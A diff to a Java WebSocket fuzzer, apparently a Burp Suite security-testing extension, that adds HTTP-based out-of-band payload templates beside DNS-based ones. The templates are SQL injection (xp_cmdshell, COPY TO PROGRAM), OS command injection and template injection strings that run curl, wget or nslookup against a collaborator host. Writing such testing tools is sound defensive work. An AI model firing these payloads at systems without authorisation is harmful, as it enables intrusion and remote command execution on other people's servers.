@@ -268,8 +268,13 @@ public class WebSocketFuzzer {
         boolean oobAvailable = collaboratorManager != null && collaboratorManager.isAvailable();
         if (oobAvailable) {
             String[] oobTemplates = {
-                    "'; EXEC xp_dirtree('\\\\%s\\a')--",
+                    // HTTP-based (Custom OOB compatible)
                     "' || (SELECT extractvalue(xmltype('<!DOCTYPE x SYSTEM \"http://%s/x\">'),'/x'))--",
+                    "'||(SELECT UTL_HTTP.REQUEST('http://%s/') FROM DUAL)||'",
+                    "'; EXEC xp_cmdshell 'curl http://%s/'--",
+                    "'; COPY (SELECT '') TO PROGRAM 'curl http://%s/'--",
+                    // DNS/UNC-based (Burp Collaborator only)
+                    "'; EXEC xp_dirtree('\\\\%s\\a')--",
                     "'; COPY (SELECT '') TO PROGRAM 'nslookup %s'--",
                     "' UNION SELECT LOAD_FILE(CONCAT('\\\\\\\\', '%s', '\\\\a'))--"
             };
@@ -333,11 +338,16 @@ public class WebSocketFuzzer {
         boolean oobAvailable = collaboratorManager != null && collaboratorManager.isAvailable();
         if (oobAvailable) {
             String[] oobTemplates = {
+                    // HTTP-based (Custom OOB compatible)
+                    ";curl http://%s/cmdi;",
+                    "$(curl http://%s/cmdi)",
+                    "|wget -q -O /dev/null http://%s/cmdi",
+                    "& curl http://%s/cmdi &",
+                    // DNS-based (Burp Collaborator only)
                     "`nslookup %s`",
                     "$(curl %s)",
                     "| ping -c1 %s",
                     "\nnslookup %s\n",
-                    ";curl http://%s;",
                     "& nslookup %s &"
             };
 
@@ -474,6 +484,12 @@ public class WebSocketFuzzer {
         boolean oobAvailable = collaboratorManager != null && collaboratorManager.isAvailable();
         if (oobAvailable) {
             String[] oobTemplates = {
+                    // HTTP-based (Custom OOB compatible)
+                    "{{config.__class__.__init__.__globals__['os'].popen('curl http://%s/ssti').read()}}",
+                    "${T(java.lang.Runtime).getRuntime().exec(new String[]{\"/bin/sh\",\"-c\",\"curl http://%s/ssti\"})}",
+                    "<%= `curl http://%s/ssti` %%>",
+                    "#{`curl http://%s/ssti`}",
+                    // DNS-based (Burp Collaborator only)
                     "{{config.__class__.__init__.__globals__['os'].popen('nslookup %s').read()}}",
                     "${T(java.lang.Runtime).getRuntime().exec('nslookup %s')}",
                     "<%= `nslookup %s` %%>",
